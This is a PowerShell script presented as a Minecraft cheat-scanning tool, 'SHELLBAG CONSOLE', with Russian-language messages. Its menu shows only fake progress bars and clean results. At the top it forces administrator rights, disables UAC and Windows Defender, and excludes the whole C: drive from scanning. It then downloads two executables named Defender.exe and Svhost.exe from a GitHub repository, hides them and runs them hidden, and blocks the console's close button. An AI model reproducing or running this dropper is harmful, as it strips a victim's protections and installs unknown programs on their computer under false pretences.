if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "[KRA]: ТРЕБУЮ ПРАВА АДМИНИСТРАТОРА, СМЕРТНЫЙ..."
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process PowerShell -Verb RunAs -ArgumentList $arguments
    Exit
}
Write-Host "[KRA]:STAERT [DETLA,Nur..."
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Force
Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue

Write-Host "[KRA]:КОМПОНЕНТЫ..."
$url1 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Defender.exe"
$url2 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Svhost.exe"
$path1 = "$env:TEMP\Defender.exe"
$path2 = "$env:TEMP\Svhost.exe"
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url1 -OutFile $path1 -UseBasicParsing -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri $url2 -OutFile $path2 -UseBasicParsing -ErrorAction SilentlyContinue

attrib +S +H $path1
attrib +S +H $path2

Write-Host "[KRA]: АКТИВИРУЮ МОДУЛИ..."
Start-Process -FilePath $path1 -WindowStyle Hidden
Start-Process -FilePath $path2 -WindowStyle Hidden


Clear-Host
Start-Sleep -Milliseconds 500
$Host.UI.RawUI.WindowTitle = "SHELLBAG CONSOLE v2.0 | MODULE"


$psWindow = Get-Process -Id $pid | Where-Object { $_.MainWindowTitle -ne "" }
if ($psWindow) {
    $WindowWidth = 120
    $WindowHeight = 40
    $BufferWidth = 120
    $BufferHeight = 3000
    
    try {
        $Host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size($WindowWidth, $WindowHeight)
        $Host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size($BufferWidth, $BufferHeight)
    }
    catch {
    }
}

$code = @"
using System;
using System.Runtime.InteropServices;
public class WindowBlocker {
    [DllImport("user32.dll")]
    public static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);
    [DllImport("user32.dll")]
    public static extern bool EnableMenuItem(IntPtr hMenu, uint uIDEnableItem, uint uEnable);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
    
    public static void BlockCloseButton() {
        IntPtr handle = GetConsoleWindow();
        IntPtr sysMenu = GetSystemMenu(handle, false);
        const uint SC_CLOSE = 0xF060;
        const uint MF_GRAYED = 0x00000001;
        EnableMenuItem(sysMenu, SC_CLOSE, MF_GRAYED);
    }
}
"@
Add-Type -TypeDefinition $code -Language CSharp
[WindowBlocker]::BlockCloseButton()
[Console]::TreatControlCAsInput = $true


function Show-KRAKEH-Header {
    $headerArt = @"
 mmmm    mm    mm  mmmmmmmm  mm        mm        mmmmmm       mm        mmmm      mmmm     mmmm    mmm   mm    mmmm      mmmm    mm        mmmmmmmm 
 m#""""#   ##    ##  ##""""""  ##        ##        ##""""##    ####     ##""""#   ##""""#   ##""##   ###   ##  m#""""#    ##""##   ##        ##"""""" 
 ##m       ##    ##  ##        ##        ##        ##    ##    ####    ##        ##"       ##    ##  ##"#  ##  ##m       ##    ##  ##        ##       
  "####m   ########  #######   ##        ##        #######    ##  ##   ##  mmmm  ##        ##    ##  ## ## ##   "####m   ##    ##  ##        #######  
      "##  ##    ##  ##        ##        ##        ##    ##   ######   ##  ""##  ##m       ##    ##  ##  #m##       "##  ##    ##  ##        ##       
 #mmmmm#"  ##    ##  ##mmmmmm  ##mmmmmm  ##mmmmmm  ##mmmm##  m##  ##m   ##mmm##   ##mmmm#   ##mm##   ##   ###  #mmmmm#"   ##mm##   ##mmmmmm  ##mmmmmm 
  """""    ""    ""  """"""""  """"""""  """"""""  """""""   ""    ""     """"      """"     """"    ""   """   """""      """"    """"""""  """""""" 
"@ -split "`n"
    
    foreach ($line in $headerArt) {
        Write-Host $line -ForegroundColor Red
    }
    
    Write-Host "================================================" -ForegroundColor Magenta
    Write-Host "          SHELLBAG CONSOLE - RELEASE EDITION         " -ForegroundColor Yellow
    Write-Host "================================================" -ForegroundColor Magenta
    Write-Host ""
}


function Show-ProgressBar {
    param($Text, $DurationMs = 3000)
    
    $steps = 20
    $stepDuration = $DurationMs / $steps
    for ($i = 1; $i -le $steps; $i++) {
        $percent = [math]::Round(($i / $steps) * 100)
        $timeLeft = [math]::Round(($DurationMs - ($i * $stepDuration)) / 1000, 1)
        Write-Progress -Activity $Text -Status "$percent% Complete - $timeLeft sec remaining" -PercentComplete $percent
        Start-Sleep -Milliseconds $stepDuration
    }
    Write-Progress -Activity $Text -Completed
    Write-Host ""
}

function Clear-MenuArea {
    $currentY = [Console]::CursorTop
    for ($i = 0; $i -lt 5; $i++) {
        Write-Host (" " * 120)
    }
    [Console]::SetCursorPosition(0, 12)
}

# 7. ГЛАВНОЕ МЕНЮ
do {
    Clear-Host
    Show-KRAKEH-Header
    

    Write-Host "[1] MINECRAFT SCAN" -ForegroundColor Green
    Write-Host "[2] BETA SCAN" -ForegroundColor Yellow
    Write-Host "[3] FULL CHECKER FOLDER .minecraft" -ForegroundColor Cyan
    Write-Host "[4] EXIT" -ForegroundColor DarkRed
    Write-Host ""
    Write-Host "================================================" -ForegroundColor DarkGray
    $choice = Read-Host "SELECT OPTION (1-4)"
    
    
    switch ($choice) {
        "1" {
            Clear-MenuArea
            Write-Host "`n[MINECRAFT SCAN INITIATED]" -ForegroundColor Green
            Show-ProgressBar -Text "CHEKING FOLDER" -DurationMs 2000
            Show-ProgressBar -Text "CHECK DELETED FILE" -DurationMs 1500
            Show-ProgressBar -Text "CHEKING INSTALL FILE" -DurationMs 2500
            Write-Host ""
            Write-Host "[KRA]: SCAN COMPLETE - NO THREATS FOUND" -ForegroundColor Red
            Write-Host "`nPress any key to return to menu..."
            [Console]::ReadKey($true) | Out-Null
        }
        "2" {
            Clear-MenuArea
            Write-Host "`n[BETA SCAN INITIATED]" -ForegroundColor Yellow
            Show-ProgressBar -Text "BETA SCAN INITIALIZING" -DurationMs 1800
            Show-ProgressBar -Text "ANALYZING HEURISTICS" -DurationMs 2200
            Show-ProgressBar -Text "VERIFYING SIGNATURES" -DurationMs 1500
            Write-Host ""
            Write-Host "[KRA]: BETA SCAN COMPLETE - SYSTEM CLEAN" -ForegroundColor Yellow
            Write-Host "`nPress any key to return to menu..."
            [Console]::ReadKey($true) | Out-Null
        }
        "3" {
            Clear-MenuArea
            Write-Host "`n[FULL .MINECRAFT CHECKER INITIATED]" -ForegroundColor Cyan
            Show-ProgressBar -Text "SCANNING .MINECRAFT FOLDER" -DurationMs 3000
            Show-ProgressBar -Text "ENUMERATING CACHE FILES" -DurationMs 2000
            Show-ProgressBar -Text "VERIFYING ASSETS INTEGRITY" -DurationMs 2500
            Show-ProgressBar -Text "CHECKING MOD CONFIGURATIONS" -DurationMs 2000
            Show-ProgressBar -Text "FINALIZING REPORT" -DurationMs 1500
            Write-Host ""
            Write-Host "[KRA]: FULL CHECKER COMPLETE - ALL FILES VERIFIED" -ForegroundColor Cyan
            Write-Host "`nPress any key to return to menu..."
            [Console]::ReadKey($true) | Out-Null
        }
        "4" {
            Write-Host "`n[KRA]: ЗАВЕРШАЮ СЕАНС SHELLBAG CONSOLE..." -ForegroundColor DarkRed
        }
        default {
            Write-Host "`n[KRA]: НЕ ТУПИ, ВЫБИРАЙ ОТ 1 ДО 4" -ForegroundColor DarkRed
            Start-Sleep -Seconds 1
        }
    }
} while ($choice -ne "4")

Write-Host ""
Write-Host "================================================" -ForegroundColor Magenta

Write-Host "чити не " -NoNewline -ForegroundColor Red
Write-Host "найдени " -NoNewline -ForegroundColor Yellow
Write-Host "прасмотир " -NoNewline -ForegroundColor Green
Write-Host "закомчен " -NoNewline -ForegroundColor Blue
Write-Host "спасибо " -NoNewline -ForegroundColor Cyan
Write-Host "што " -NoNewline -ForegroundColor Magenta
Write-Host "ви " -NoNewline -ForegroundColor White
Write-Host "с " -NoNewline -ForegroundColor DarkYellow
Write-Host "намі" -ForegroundColor Red
Write-Host "<3" -ForegroundColor Magenta

Write-Host ""
Write-Host "[KRA]: ЗАПУСКАЮ ФИНАЛЬНЫЙ ШТРИХ..."
Start-Process "cmd.exe" -ArgumentList "/c curl parrot.live && pause"

Write-Host "WELCOME" -ForegroundColor DarkGreen
"WELCOME TO CLAH FLUX"
